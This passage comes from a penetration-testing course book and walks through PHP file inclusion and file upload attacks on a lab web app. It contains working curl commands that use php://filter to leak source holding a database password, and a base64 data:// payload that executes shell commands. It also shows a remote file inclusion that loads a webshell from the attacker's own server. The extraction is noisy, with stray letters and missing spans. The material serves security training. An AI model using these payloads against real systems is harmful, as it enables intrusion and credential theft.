n
applications, since most of the other frameworks and server-side scripting languages are dated
and therefore less common. Additionally, modern frameworks and languages are often by design
not vulnerable or have protection imechanisms enabled by default against LFI. However, we
should be aware that we can alsoz find LFI vulnerabilities in modern back-end JavaScript runtime
environments like Node.js.412
D
9.2.2 PHP Wrappers
PHP offers a variety of protocol wrappers to enhance the language’s capabilities. For example,
PHP wrappers can be used to represent and access local or remote filesystems. We can use
these wrappers to bypass filters or obtain code execution via File Inclusion vulnerabilities in PHP
web applications. While we’ll only examine the php://filter413 and data://414 wrappers, many are
available.415
407 (Wikipedia, 2022), https://www.apachefriends.org/index.html
408 (Perl, 2022), https://www.perl.org
409 (Wikipedia, 2022), https://en.wikipedia.org/wiki/ASP.NET
410 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Active_Server_Pages
411 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Jakarta_Server_Pages
412 (Node.js, 2022), https://nodejs.org/en/
413 (PHP Manual, 2021), https://www.php.net/manual/en/wrappers.php.php
414 (PHP Manual, 2020), https://www.php.net/manual/en/wrappers.data.php
415 (PHP Manual, 2010), https://www.php.net/manual/en/wrappers.php
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 263
Made in Morocco
Penetration Testing with Kali Linux
We can use the php://filter wrapper to display the contents of files either with or without
encodings like ROT13416 or Base64.417 In the previous section, we covered using LFI to include the
contents of files. Using php://filter, we can also display the contents of executable files such as
.php, rather than executing them. This allows us to review PHP files for sensitive information and
analyze the web application’s logic.
Let’s demonstrate this by revisiting the “Mountain Desserts” web application. First we’ll provide
the admin.php file as a value for the “page” parameter, as in the last Learning Unit.
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
...
Admin
y
Maintenance k
The admin page is currently under
maintenance.
Listing 147 - Contents of the admin.php file
o
Listing 147 shows the title and maintenance text we already encountered while reviewing the web
application earlier. We also notice that the  tag is not closed at the end of the HTML code.
n
We can assume that something is missing. PHP code will be executed server side and, as such, is
not shown. When we compare this output with previous inclusions or review the source code in
the browser, we can conclude that thie rest of the index.php page’s content is missing.
z
Next, let’s include the file, using php://filter to better understand this situation. We will not use any
encoding on our first attempt. The PHP wrapper uses resource as the required parameter to
D
specify the file stream for filtering, which is the filename in our case. We can also specify absolute
or relative paths in this parameter.
kali@kali:~$ curl
http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
...
Admin
Maintenance
The admin page is currently under
maintenance.
Listing 148 - Usage of “php://filter” to include unencoded admin.php
416 (PHP Manual, 2020), https://www.php.net/manual/en/function.str-rot13.php
417 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Base64
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 264
Made in Morocco
Penetration Testing with Kali Linux
The output of Listing 148 shows the same result as Listing 147. This makes sense since the PHP
code is included and executed via the LFI vulnerability. Let’s now encode the output with base64
by adding convert.base64-encode. This converts the specified resource to a base64 string.
kali@kali:~$ curl
http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-
encode/resource=admin.php
...
Admin
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOC
I+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFs
LXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
...
Listing 149 - Usage of “php://filter” to include base64 encoded admin.php
y
Listing 149 shows that we included base64 encoded data, while the rest of the page loaded
correctly. We can now use the base64 program with the -d flag to decode the encoded data in the
k
terminal.
kali@kali:~$ echo s
"PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtO
CI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWF
o
sLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgI
CAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGF
kbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZ
n
SA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiM
iOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hb
WUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewo
i
gIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ub
z
mVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
 D
Maintenance
The admin page is
currently under maintenance.'; ?>
"
... k
Admin
admin.php
s
bavarian.php
css
fonts o
img
index.php
js n
...
Listing 151 - Usage of the “data://” wrapper to execute ls
i
Listing 151 shows that our embzedded data was successfully executed via the File Inclusion
vulnerability and data:// wrapper.
D
When web application firewalls or other security mechanisms are in place, they may filter strings
like “system” or other PHP code elements. In such a scenario, we can try to use the data://
wrapper with base64-encoded data. We’ll first encode the PHP snippet into base64, then use curl
to embed and execute it via the data:// wrapper.
kali@kali:~$ echo -n '' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
kali@kali:~$ curl
"http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZW
NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
...
Admin
admin.php
bavarian.php
css
fonts
img
index.php
418 (MySQL, 2022), https://www.mysql.com/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 266
Made in Morocco
Penetration Testing with Kali Linux
js
start.sh
...
Listing 152 - Usage of the “data://” wrapper with base64 encoded data
Listing 152 shows that we successfully achieved code execution with the base64-encoded PHP
snippet. This is a handy technique that may help us bypass basic filters. However, we need to be
aware that the data:// wrapper will not work in a default PHP installation. To exploit it, the
allow_url_include419 setting needs to be enabled.
9.2.3 Remote File Inclusion (RFI)
Remote file inclusion (RFI) vulnerabilities are less common than LFIs since the target system
must be configured in a specific way. In PHP web applications, for example, the allow_url_include
option needs to be enabled to leverage RFI, just as with the data:// wrapper from the previous
y
section. As stated, it is disabled by default in all current versions of PHP. While LFI vulnerabilities
can be used to include local files, RFI vulnerabilities allow us to include files from a remote
k
system over HTTP420 or SMB.421 The included file is also executed in the context of the web
application. Common scenarios where we’ll find this option enabled is when the web application
loads files or contents from remote systems e.g. librarsies or application data. We can discover
RFI vulnerabilities using the same techniques covered in the Directory Traversal and LFI sections.
o
Kali Linux includes several PHP webshells in the /usr/share/webshells/php/ directory that can be
used for RFI. A webshell is a small script that provides a web-based command line interface,
making it easier and more convenient to nexecute commands. In this example, we will use the
simple-backdoor.php webshell to exploit an RFI vulnerability in the “Mountain Desserts” web
application.
i
First, let’s briefly review the conteznts of the simple-backdoor.php webshell. We’ll use it to test the
LFI vulnerability from the previous sections for RFI. The code is very similar to the PHP snippet
we used in previous sections. It accepts commands in the cmd parameter and executes them via
D
the system function.
kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
...
";
$cmd = ($_REQUEST['cmd']);
system($cmd);
echo "";
die;
}
?>
Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
...
Listing 153 - Location and contents of the simple-backdoor.php webshell
419 (PHP Manual, 2022), https://www.php.net/manual/en/filesystem.configuration.php
420 (Mozilla Developer Network, 2022), https://developer.mozilla.org/en-US/docs/Web/HTTP
421 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Server_Message_Block
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 267
Made in Morocco
Penetration Testing with Kali Linux
To leverage an RFI vulnerability, we need to make the remote file accessible by the target system.
We can use the Python3422 http.server423 module to start a web server on our Kali machine and
serve the file we want to include remotely on the target system. The http.server module sets the
web root to the current directory of our terminal.
We could also use a publicly-accessible file, such as one from Github.
kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
Listing 154 - Starting the Python3 http.server module
After the web server is running with /usr/share/webshells/php/ as its current directory, we have
y
completed all necessary steps on our attacking machine. Next, we’ll use curl to include the hosted
file via HTTP and specify ls as our command.
k
kali@kali:/usr/share/webshells/php/$ curl
"http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-
s
backdoor.php&cmd=ls"
...
Admin
admin.php n
bavarian.php
css
fonts i
img z
index.php
js
D
Listing 155 - Exploiting RFI with a PHP backdoor and execution of ls
Listing 155 shows that we successfully exploited an RFI vulnerability by including a remotely
hosted webshell. We could now use Netcat again to create a reverse shell and receive an
interactive shell on the target system, as in the LFI section.
9.3 File Upload Vulnerabilities
This Learning Unit covers the following Learning Objectives:
• Understand File Upload vulnerabilities
• Learn how to identify File Upload vulnerabilities
• Explore different vectors to exploit File Upload vulnerabilities
422 (Python Documentation, 2022), https://docs.python.org/3/
423 (Python Documentation, 2022), https://docs.python.org/3/library/http.server.html
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 268
Made in Morocco
Penetration Testing with Kali Linux
Many web applications provide functionality to upload files. In this Learning Unit, we will learn
how to identify, exploit, and leverage File Upload vulnerabilities to access the underlying system or
execute code. In general, we can group File Upload vulnerabilities into three categories:
The first category consists of vulnerabilities enabling us to upload files that are executable by the
web application. For example, if we can upload a PHP script to a web server where PHP is
enabled, we can execute the script by accessing it via the browser or curl. As we observed in the
File Inclusion Learning Unit, apart from PHP, we can also leverage this kind of vulnerability in
other frameworks or server-side scripting languages.
The second category consists of vulnerabilities that require us to combine the file upload
mechanism with another vulnerability, such as Directory Traversal. For example, if the web
application is vulnerable to Directory Traversal, we can use a relative path in the file upload
request and try to overwrite files like authorized_keys. Furthermore, we can also combine file
upload mechanisms with XML External Entity (XXE)424 or Cross Site Sycripting (XSS)425 attacks. For
example, when we are allowed to upload an avatar to a profile with an SVG426 file type, we may
embed an XXE attack to display file contents or even execute code.
k
The third category relies on user interaction. For example, when we discover an upload form for
job applications, we can try to upload a CV in .docx427 fosrmat with malicious macros428 integrated.
Since this category requires a person to access our uploaded file, we will focus on the other two